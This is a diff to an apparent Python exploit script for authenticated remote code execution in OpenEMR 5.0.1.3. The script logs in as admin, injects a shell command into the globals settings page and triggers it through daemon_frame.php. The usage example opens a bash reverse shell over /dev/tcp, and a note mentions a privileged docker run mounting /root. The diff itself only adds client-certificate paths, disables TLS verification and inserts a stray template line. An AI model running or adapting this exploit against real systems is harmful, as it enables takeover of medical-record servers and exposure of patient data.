@@ -14,6 +14,9 @@ If you don't want the OpenEMR config to be reset to default, please modify
 the payload.
 docker run -v /root:/testfile -v /tmp:/testtmp -v --privileged -i ubuntu bash
 
+
+response = requests.post(url, data=your_data, cert=('path_client_certificate_file', 'path_certificate_key_file'), verify='path_rootCA',)
+
 Example Usage: 
 - python openemr_rce.py http://127.0.0.1/openemr-5_0_1_3 -u admin -p admin -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'
 '''
@@ -64,7 +67,7 @@ with requests.session() as s:
             }
     
     print(load + "Authenticating with " + args.user + ":" + args.password)
-    r = s.post(args.host + "/interface/main/main_screen.php?auth=login&site=default", data=login)
+    r = s.post(args.host + "/interface/main/main_screen.php?auth=login&site=default", data=login, verify=False)
     if "login_screen.php?error=1&site=" in r.text:
         print(err + "Failed to Login.")
         sys.exit(0)
@@ -138,7 +141,7 @@ with requests.session() as s:
     p.update({"form_284": _cmd})
     
     print(load + "Injecting payload")
-    s.post(args.host + "/interface/super/edit_globals.php", data=p)
+    s.post(args.host + "/interface/super/edit_globals.php", data=p, cert=('/home/m3rl1n/Downloads/http-client.pem', '/home/m3rl1n/Downloads/http-client.key'), verify=False)
     sp = s.get(args.host + "/interface/main/daemon_frame.php") # M4tt D4em0n w0z h3r3 ;PpPpp
     if sp.status_code == 200:
         print(load + "Payload executed")
